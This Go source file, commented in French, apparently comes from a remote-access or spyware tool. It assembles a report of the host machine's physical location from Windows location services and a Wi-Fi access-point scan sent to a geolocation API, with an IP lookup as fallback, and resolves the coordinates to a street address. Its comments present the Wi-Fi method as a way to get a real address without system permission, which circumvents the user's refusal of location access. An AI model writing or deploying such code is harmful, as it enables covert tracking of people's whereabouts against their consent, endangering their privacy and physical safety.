// location.go — géolocalisation : coordonnées précises si Windows les donne,
// adresse postale approchée sinon.
//
// Trois sources, dans cet ordre :
//  1. la position Windows (Windows.Devices.Geolocation) — précise au mètre
//     quand l'utilisateur a autorisé la localisation, souvent refusée sinon ;
//  2. ipinfo.io — ville et coordonnées du FAI, toujours disponible ;
//  3. Nominatim — transforme des coordonnées en adresse lisible.
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

type geoIP struct {
	IP       string `json:"ip"`
	City     string `json:"city"`
	Region   string `json:"region"`
	Country  string `json:"country"`
	Loc      string `json:"loc"` // "lat,lon"
	Org      string `json:"org"`
	Timezone string `json:"timezone"`
	Postal   string `json:"postal"`
}

// locationReport assemble le rapport de géolocalisation, du plus précis au
// plus grossier.
func locationReport() string {
	var b strings.Builder

	// 1. Position Windows (GPS/Wi-Fi du système, si l'utilisateur l'autorise).
	if lat, lon, acc := windowsLocation(); lat != "" {
		fmt.Fprintf(&b, "position Windows : %s, %s (±%s m)\n", lat, lon, acc)
		if addr := reverseGeocode(lat, lon); addr != "" {
			fmt.Fprintf(&b, "adresse : %s\n", addr)
		}
		fmt.Fprintf(&b, "carte : https://www.google.com/maps?q=%s,%s\n\n", lat, lon)
	}

	// 2. Géolocalisation par les bornes Wi-Fi environnantes : c'est la vraie
	// précision (10-50 m) quand la position système est refusée.
	if lat, lon, acc, n := wifiGeolocate(); lat != 0 || lon != 0 {
		fmt.Fprintf(&b, "position Wi-Fi : %.6f, %.6f (±%d m, %d bornes)\n", lat, lon, acc, n)
		if addr := reverseGeocode(fmt.Sprintf("%.6f", lat), fmt.Sprintf("%.6f", lon)); addr != "" {
			fmt.Fprintf(&b, "adresse : %s\n", addr)
		}
		fmt.Fprintf(&b, "carte : https://www.google.com/maps?q=%.6f,%.6f\n\n", lat, lon)
	}

	// 3. Repli IP : ville et FAI, jamais l'adresse exacte.
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	req, _ := http.NewRequestWithContext(ctx, "GET", "https://ipinfo.io/json", nil)
	req.Header.Set("User-Agent", discordUA)
	resp, err := httpc.Do(req)
	if err != nil {
		if b.Len() == 0 {
			return "erreur géoloc : " + err.Error()
		}
		return b.String() + "réseau : " + err.Error()
	}
	defer resp.Body.Close()

	var g geoIP
	if err := json.NewDecoder(resp.Body).Decode(&g); err != nil {
		return b.String() + "erreur lecture géoloc : " + err.Error()
	}

	latLon := strings.Split(g.Loc, ",")
	lat, lon := "?", "?"
	if len(latLon) == 2 {
		lat, lon = latLon[0], latLon[1]
	}
	fmt.Fprintf(&b, "IP publique : %s\nVille : %s (%s) %s\nFAI : %s\nFuseau : %s\nCoordonnées IP : %s, %s\n",
		g.IP, g.City, g.Postal, g.Country, g.Org, g.Timezone, lat, lon)
	if b.Len() < 60 { // aucune autre source : l'adresse IP est tout ce qu'on a
		if addr := reverseGeocode(lat, lon); addr != "" {
			fmt.Fprintf(&b, "Adresse approchée : %s\n", addr)
		}
	}
	fmt.Fprintf(&b, "Carte : https://www.google.com/maps?q=%s,%s", lat, lon)
	return b.String()
}

var reMAC = regexp.MustCompile(`([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}`)

// wifiScan liste les bornes visibles : adresse MAC et force du signal.
// `netsh wlan show networks mode=bssid` est localisé, mais une adresse MAC a
// toujours la même forme : on l'extrait par expression régulière plutôt que
// de découper des libellés traduits.
func wifiScan() []map[string]any {
	out, err := runNetSH("wlan", "show", "networks", "mode=bssid")
	if err != nil {
		return nil
	}
	var aps []map[string]any
	var cur map[string]any
	for _, line := range strings.Split(out, "\n") {
		l := strings.TrimSpace(line)
		if mac := reMAC.FindString(l); mac != "" {
			if cur != nil {
				aps = append(aps, cur)
			}
			cur = map[string]any{"macAddress": mac}
			continue
		}
		if cur == nil {
			continue
		}
		low := strings.ToLower(l)
		if strings.Contains(low, "signal") || strings.Contains(low, "force") {
			if i := strings.LastIndex(l, ":"); i > 0 {
				v := strings.TrimSpace(strings.TrimSuffix(strings.TrimSpace(l[i+1:]), "%"))
				if n, err := atoi(v); err == nil && n >= 0 && n <= 100 {
					cur["signalStrength"] = -100 + n/2
				}
			}
		}
	}
	if cur != nil {
		aps = append(aps, cur)
	}
	return aps
}

// wifiGeolocate interroge le service de localisation Mozilla (gratuit, sans
// clé) avec les bornes visibles. Précision typique : 10 à 50 mètres — c'est
// la seule façon d'obtenir une adresse réelle sans autorisation système.
func wifiGeolocate() (lat, lon float64, accuracy, count int) {
	aps := wifiScan()
	if len(aps) < 1 {
		return 0, 0, 0, 0
	}
	body, _ := json.Marshal(map[string]any{"wifiAccessPoints": aps})
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "POST",
		"https://api.beacondb.net/v1/geolocate",
		strings.NewReader(string(body)))
	if err != nil {
		return 0, 0, 0, 0
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", discordUA)
	resp, err := httpc.Do(req)
	if err != nil {
		return 0, 0, 0, 0
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		plog(fmt.Sprintf("géoloc Wi-Fi : HTTP %d", resp.StatusCode))
		return 0, 0, 0, 0
	}
	var r struct {
		Location struct {
			Lat float64 `json:"lat"`
			Lng float64 `json:"lng"`
		} `json:"location"`
		Accuracy float64 `json:"accuracy"`
		Fallback string  `json:"fallback"`
	}
	if json.NewDecoder(resp.Body).Decode(&r) != nil {
		return 0, 0, 0, 0
	}
	// `fallback: ipf` signifie que la borne est inconnue : la réponse n'est
	// qu'une position IP (25 km), inutile comme adresse.
	if r.Fallback == "ipf" || r.Accuracy > 5000 {
		return 0, 0, 0, 0
	}
	return r.Location.Lat, r.Location.Lng, int(r.Accuracy), len(aps)
}

// windowsLocation interroge l'API de localisation de Windows. Les autorisations
// sont souvent refusées sur un poste : la fonction rend des chaînes vides et
// l'appelant se rabat sur la géolocalisation IP.
func windowsLocation() (string, string, string) {
	script := `
try {
  [void][Windows.Devices.Geolocation.Geolocator,Windows.Devices.Geolocation,ContentType=WindowsRuntime]
  Add-Type -AssemblyName System.Runtime.WindowsRuntime
  $g = New-Object Windows.Devices.Geolocation.Geolocator
  $g.DesiredAccuracyInMeters = 10
  $op = $g.GetGeopositionAsync()
  $m = [System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
    $_.Name -eq 'AsTask' -and $_.IsGenericMethodDefinition -and
    $_.GetParameters().Count -eq 1 -and
    $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation` + "`1" + `'
  } | Select-Object -First 1
  $task = $m.MakeGenericMethod([Windows.Devices.Geolocation.Geoposition]).Invoke($null, @($op))
  [void]$task.Wait(12000)
  $p = $task.Result.Coordinate
  Write-Output ("$($p.Point.Position.Latitude)|$($p.Point.Position.Longitude)|$($p.Accuracy)")
} catch { Write-Output 'FAIL' }`
	out, err := runPSUTF8(script)
	if err != nil || strings.Contains(out, "FAIL") {
		return "", "", ""
	}
	parts := strings.Split(strings.TrimSpace(out), "|")
	if len(parts) != 3 {
		return "", "", ""
	}
	return parts[0], parts[1], parts[2]
}

// reverseGeocode convertit « lat,lon » en adresse lisible via Nominatim
// (OpenStreetMap, gratuit, une requête par appel).
func reverseGeocode(lat, lon string) string {
	if lat == "" || lon == "" || lat == "?" || lon == "?" {
		return ""
	}
	ctx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
	defer cancel()

	u := "https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=18&addressdetails=0" +
		"&lat=" + url.QueryEscape(lat) + "&lon=" + url.QueryEscape(lon)
	req, err := http.NewRequestWithContext(ctx, "GET", u, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("User-Agent", discordUA)
	resp, err := httpc.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	var r struct {
		DisplayName string `json:"display_name"`
	}
	if json.NewDecoder(resp.Body).Decode(&r) != nil {
		return ""
	}
	return strings.TrimSpace(r.DisplayName)
}
